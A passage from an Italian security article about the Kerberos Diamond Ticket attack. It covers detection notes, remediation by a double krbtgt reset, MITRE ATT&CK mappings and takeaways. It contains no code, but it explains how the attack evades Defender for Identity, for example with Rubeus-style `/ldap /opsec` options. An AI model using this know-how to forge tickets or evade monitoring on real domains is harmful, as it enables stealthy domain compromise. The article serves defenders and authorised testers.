Significativa in ambienti con MDI: il Golden Ticket genera alert quasi immediati per assenza AS-REQ. Il Diamond Ticket richiede detection più sofisticata (PAC mismatch, KDCOptions anomali). Con `/ldap /opsec` la detection diventa molto difficile senza MDI configurato specificamente.

**Stessa remediation del Golden Ticket?**
Sì. Doppio reset krbtgt. L'account low-privilege usato per l'AS-REQ va anche lui resettato/disabilitato.

***

## Mappazione MITRE ATT\&CK

| Tattica           | Tecnica                                                         | Descrizione                                    |
| ----------------- | --------------------------------------------------------------- | ---------------------------------------------- |
| Credential Access | **[T1558.001](https://attack.mitre.org/techniques/T1558/001/)** | Diamond/Golden Ticket (Forge Kerberos Tickets) |
| Credential Access | **[T1003.006](https://attack.mitre.org/techniques/T1003/006/)** | DCSync (per ottenere krbtgt hash)              |
| Lateral Movement  | **[T1550.003](https://attack.mitre.org/techniques/T1550/003/)** | Pass the Ticket                                |
| Lateral Movement  | **[T1021.002](https://attack.mitre.org/techniques/T1021/002/)** | SMB/Admin Shares                               |
| Persistence       | **[T1078](https://attack.mitre.org/techniques/T1078/)**         | Valid Accounts                                 |
| Defense Evasion   | **[T1550.003](https://attack.mitre.org/techniques/T1550/003/)** | PAC manipulation per evitare detection         |

***

## Takeaway finale

1. **Il Diamond Ticket non è un attacco diverso dal Golden — è una variante stealth dello stesso**. Stesso hash, stesso impatto, stessa remediation. Cambia il meccanismo per evitare la detection.
2. **Con `/ldap /opsec` (Huntress 2025), il Diamond Ticket è quasi invisibile** senza MDI configurato specificamente per PAC anomaly detection.
3. **La difesa efficace ha due livelli**: proteggere l'hash krbtgt (evita che arrivi al punto di usare Diamond/Golden) e abilitare MDI con PAC validation per rilevarlo se l'hash è già compromesso.
4. **Stessa remediation del Golden**: doppio reset krbtgt. Niente di più, niente di meno.

***

## Conclusione

Il Diamond Ticket è la risposta tecnica all'evoluzione dei sistemi di detection: quando MDI e i SIEM hanno imparato a rilevare il Golden Ticket tramite l'assenza di AS-REQ, la comunità offensiva ha risposto rendendo il ticket di partenza reale. Con `/ldap` e `/opsec`, il profilo del Diamond Ticket è quasi indistinguibile da un'autenticazione legittima.

Questo è il pattern ricorrente di Kerberos ticket attacks: ogni mitigazione genera una variante più sofisticata. Il [Sapphire Ticket](https://hackita.it/articoli/sapphire-ticket/) porta questa evoluzione al livello successivo con un PAC completamente autentico.

La difesa non può basarsi solo sul rilevamento dei singoli ticket — deve partire dalla protezione dell'hash krbtgt tramite controllo degli accessi, monitoring [DCSync](https://hackita.it/articoli/dcsync/) in tempo reale, e mapping dei path con [BloodHound](https://hackita.it/articoli/bloodhound/). Se l'hash non esce, Diamond e Golden non esistono.

***

## Articoli correlati

* [Kerberos — autenticazione in Active Directory](https://hackita.it/articoli/kerberos/)
* [Golden Ticket](https://hackita.it/articoli/golden-ticket/)
* [Silver Ticket](https://hackita.it/articoli/silver-ticket/)
* [Sapphire Ticket](https://hackita.it/articoli/sapphire-ticket/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [Pass-the-Ticket](https://hackita.it/articoli/pass-the-ticket/)
* [Rubeus](https://hackita.it/articoli/rubeus/)
* [Impacket](https://hackita.it/articoli/impacket/)
* [BloodHound](https://hackita.it/articoli/bloodhound/)
* [Mimikatz](https://hackita.it/articoli/mimikatz/)
* [NetExec](https://hackita.it/articoli/netexec/)
* [Active Directory — exploitation](https://hackita.it/articoli/active-directory/)

***

## Fonti e riferimenti esterni

* [MITRE ATT\&CK – T1558.001: Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/001/)
* [MITRE ATT\&CK – T1003.006: DCSync](https://attack.mitre.org/techniques/T1003/006/)
* [Huntress – Recutting the Kerberos Diamond Ticket (2025)](https://www.huntress.com/blog/recutting-the-kerberos-diamond)
* [HackTricks – Diamond Ticket](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/diamond-ticket.html)
* [Microsoft – New-KrbtgtKeys.ps1](https://github.com/microsoft/New-KrbtgtKeys.ps1)
* [Impacket – ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)

> Uso esclusivo in ambienti autorizzati.

\#diamond-ticket #kerberos #active-directory #windows #persistence #rubeus
